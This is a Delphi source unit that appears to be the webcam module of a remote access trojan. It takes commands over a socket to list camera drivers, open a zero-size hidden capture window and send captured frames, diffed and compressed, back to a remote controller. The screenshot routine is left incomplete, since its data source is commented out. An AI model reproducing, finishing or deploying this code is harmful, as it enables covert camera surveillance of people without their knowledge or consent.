unit UnitWebcam;

interface

uses
  windows,socketunit, unitshareddata, umsfpack, CompressionStreamUnit, messages;

const
  WM_CAP_START = $400;
  WM_CAP_DRIVER_CONNECT = WM_CAP_START + $a;
  WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + $b;
  WM_CAP_EDIT_COPY = WM_CAP_START + $1e;
  WM_CAP_GRAB_FRAME = WM_CAP_START + $3c;
  WM_CAP_STOP = WM_CAP_START + $44;
  WM_CAP_SAVEDIB = $0400 + 25;

var
  LibHandle: THandle;
  CaptureWindow: THandle;
  CapGetDriverDescriptionA: function(DrvIndex:cardinal; Name:pansichar;NameLen:cardinal;Description:pansichar;DescLen:cardinal):bool; stdcall;
  CapCreateCaptureWindowA: function(lpszWindowName: pchar; dwStyle: dword; x, y, nWidth, nHeight: word; ParentWin: dword; nId: word): dword; stdcall;

threadvar
  CaptureData: string;
  BitCount: integer;

procedure ParseData(Socket: TClientSocket; Data: string);

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'WebcamCapture|' + Data);
end;

function CompareString(s1,s2: string; Len: dword): string;
var
  i: integer;
begin
  setlength(Result,Len);
  for i := 1 to Len do begin
    if s1[i] <> s2[i] then begin
      Result[i] := s2[i];
    end else begin
      Result[i] := '%';
    end;
  end;
end;

function ListCamDrivers: string;
var
  x:cardinal;
  names: string;
  Descriptions: string;
begin
  for x := 0 to 9 do begin
    setlength(Names,256);
    setlength(Descriptions,256);
    if not capGetDriverDescriptionA(x,pchar(Names),256,pchar(Descriptions),256) then continue;
    if length(Names) > 0 then result := result + Names + '|';
  end;
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  D: string;
  Command: string;
  stringtosend: string;
  BCount: integer;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'CamList' then begin
    SendData(Socket,Command + '|' + ListCamDrivers);
  end;

  if Command = 'Connect' then begin
    CaptureWindow := capCreateCaptureWindowA('CaptureWindow', WS_CHILD and WS_VISIBLE, 0, 0, 0, 0, GetDesktopWindow, 0);
    if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, StrToInt(Data), 0) <> 1 then begin
      SendMessage(CaptureWindow, WM_CLOSE, 0, 0);
      CaptureWindow := 0;
      Exit;
    end;
  end;

  if Command = 'ScreenShot' then begin

    BCount := StrToInt(Data);
    if BitCount <> BCount then begin
      BitCount := BCount;
      capturedata := '';
    end;

    //D := SaveBitmapToFile(GetDesktop(0),BitCount,'');
    if capturedata = '' then CaptureData := StringOfChar('%',Length(d));
    stringtosend := comparestring(capturedata,d,length(d));
    capturedata := d;
    stringtosend := SFPackStr(stringtosend);
    //stringtosend := Compress(stringtosend);
    SendData(Socket,Command + '|' + stringtosend);

    //GetCursorPos(Pt);
    //SendData(Socket,'CursorPos|' + inttostr(Pt.X) + '|' + inttostr(pt.Y));

  end;

  if Command = 'ClearData' then begin
    capturedata := '';
  end;


end;

initialization
  LibHandle := LoadLibrary('avicap32.dll');
  CapGetDriverDescriptionA := GetProcAddress(LibHandle,'capGetDriverDescriptionA');
  CapCreateCaptureWindowA := GetProcAddress(LibHandle,'capCreateCaptureWindowA');

end.
